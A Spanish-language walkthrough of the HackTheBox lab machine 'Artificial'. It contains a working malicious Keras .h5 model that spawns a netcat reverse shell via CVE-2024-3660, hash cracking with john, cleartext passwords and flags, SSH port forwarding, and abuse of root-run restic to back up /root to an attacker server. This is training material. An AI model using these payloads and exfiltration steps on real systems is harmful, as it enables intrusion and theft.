Enumeración Nmap Link to heading

Comando:

nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts
Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb lo cual agregamos a nuestro /etc/hosts # Enumeración puerto HTTP 80

Entramos a la página web y solo tenemos dos opciones /login /register Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs Nos registramos al sitio web y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5 Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1 y el Dockerfile para compilar nuestro archivo .h5

Explotación Link to heading

Buscando por vulnerabilidad de tensorflow 2.13.1 encontramos cve 2024-3660, por tanto buscamos un poc y tenemos la primera página github Nos vamos al exploit.py que tiene el siguiente código con reverse shell 

import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")

Para correr el script necesitamos tener instalado tensorflow, para eso utilizaremos el archivo Dockerfile que nos dió la web

haremos el siguiente comando para crear la imagen

docker build -t python_tensor .

Posteriormente utilizaremos el siguiente comando para entrar en la imagen

docker run -it --rm python_tensor

Una vez dentro del contenedor, instalamos nano para crear nuestros script en python

apt-get update && apt-get install -y nano

Y creamos nuestro exploit.py con el script que encontramos en github, editando la IP y puerto en escucha ahora corremos el script y nos creará el archivo “exploit.h5” Pasamos el exploit.h5 hacia nuestra máquina local con el siguiente comando

docker ps
docker cp [id del contenedor]:/code/exploit.h5 /home/kali/Desktop/Artificial/exploit.h5

Con el archivo en nuestra máquina local, nos pondremos en escucha, y subiremos el exploit.h5 Consiguiendo consola

Movimiento lateral Link to heading

Dentro del sistema, vemos 3 usuarios con consola. app, gael y root. Por tanto nuestro objetivo será migrar hacia el usuario gael

Una vez dentro de la máquina víctima nos encontramos las siguientes carpetas, dentro de instance encontramos users.db

Nos conectaremos a la base de datos con sqlite3, debido que en el archivo app.py nos muestra que se usa esa base de datos 

sqlite3 users.db

Dentro de la base de datos tenemos dos tablas, model y user en la tabla user tenemos usuarios, correos y contraseñas hasheadas Guardamos el hash del usuario gael Analizandolo podemos ver que es un hash en md5, por tanto utilizaremos john para desencriptarlo, con el siguiente comando

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
La contraseña es: mattp005numbertwo, por tanto nos conectaremos por ssh con el usuario gael y esa contraseña 
ssh gael@artificial.htb

Obtenemos la flag de user.txt 57d1b624447107af7760f746fe049faa

Escalada de privilegios Link to heading

Viendo los puertos activos en la máquina víctima tenemos el puerto 5000, que es el que está corriendo el puerto 80 y el puerto 9898

ss -alpn | grep "127.0.0.1"

Realizaremos un local portfowarding para ver el servicio del puerto 9898

ssh -L [puerto_local]:localhost:[puerto_remoto] usuario@servidor_ssh

En este caso

ssh -L 9898:localhost:9898 gael@artificial.htb

Ahora abrimos un navegador y usamos http://localhost:9898 Buscamos en internet qué es backrest, y encontramos que es una aplicación web para hacer backup’s para una aplicación CLI llamada restic backup por tanto buscaremos archivos backup en el sistema

find / -name *backup*  2>/dev/null | grep -vE "lib|headers"

el archivo backrest_backup.tar.gz parece interesante, lo copiamos a nuestra carpeta /tmp

cp /var/backups/backrest_backup.tar.gz /tmp/backrest_backup.tar.gz

y luego lo descomprimimos con tar

tar -xf backrest_backup.tar.gz
vamos a la carpeta backrest y hacemos ls -la, donde encontramos una carpeta .config Dentro de ella hay otra carpeta backrest, y dentro hay un archivo config.json El archivo contiene nombre de usuario: backrest_root y contraseña: JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP La contraseña dice ser bcrypt pero no tiene el formato correcto, parece estar en base64, por tanto haremos un base64 -d ```bash echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d ``` Ahora parece estar bien el hash bcrypt, lo guardamos en un archivo llamado bcrypt.txt y utilizaremos john para descifrarlo ```bash john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt bcrypt.txt ``` Consiguiendo la contraseña `!@#$%^`

Por tanto nos conectaremos a backrest web con las siguientes credenciales backrest_root:!@#$%^ Nos conectamos exitosamente

Abusando de restic sudo Link to heading

Para escalar privilegios aprovecharemos que restic se corre como root, para eso realizaremos una copia de seguridad de /root/ y la enviaremos a nuestra máquina local, para ver la flag root.txt y además ver sus claves rsa

Descargando restic server Link to heading

En nuestra máquina local necesitamos descargar restic-server

git clone https://github.com/restic/rest-server.git
cd rest-server

Además necesitaremos instalar go, podemos buscar en internet como hacerlo. Luego de tener go hacemops los siguientes comandos

GOARCH=amd64 GOOS=linux go build -o rest-server ./cmd/rest-server  
./rest-server --path /tmp/restictemp --listen :8888 --no-auth
### Creamos el repositorio en la web

En la web creamos el repositorio con los siguientes datos

Name: backuprepo  
Repository URI: /opt/backrest  
Password: test12345

Y le damos a Submit

Corremos comandos en backrest Link to heading

En la web vamos al apartado de nuestro repositorio creado y le damos a “Run command” en “Run command” escribimos los siguientes comandos

-r rest:http://10.10.14.49:8888/backuprepo init

Luego ponemos el siguiente comando, que hace el backup de la carpeta /root de la máquina víctima

-r rest:http://10.10.14.49:8888/backuprepo backup /root

Si todo salió bien tenemos los dos iconos de consola verde

Recuperar el backup en máquina local Link to heading

Ahora en nuestra Máquina local utilizaremos los siguientes comandos para obtener los backups de la máquina víctima

restic -r /tmp/restictemp/backuprepo snapshots

y ponemos la contraseña que creamos “test12345”

Acá debemos poner el ID que aparece como output en el comando anterior

restic -r /tmp/restictemp/backuprepo restore <snapshot_id> --target /tmp/restore

y ponemos nuevamente la contraseña “test12345” y finalmente obtenemos el backup de /root/ de la máquina víctima en /tmp/restore de nuestra máquina local

cd /tmp/restore
y obtenemos la flag de root.txt

Post explotación Link to heading

Conseguiremos la conexión a la máquina mediante el robo de su clave RSA

ya tenemos el id_rsa del usuario root de la máquina víctima por tanto cambiaremos los permisos a 400 con el siguiente comando

chmod 400 id_rsa

y nos conectaremos por ssh de la siguiente forma

ssh -i id_rsa root@artificial.htb

y así pwneamos la máquina
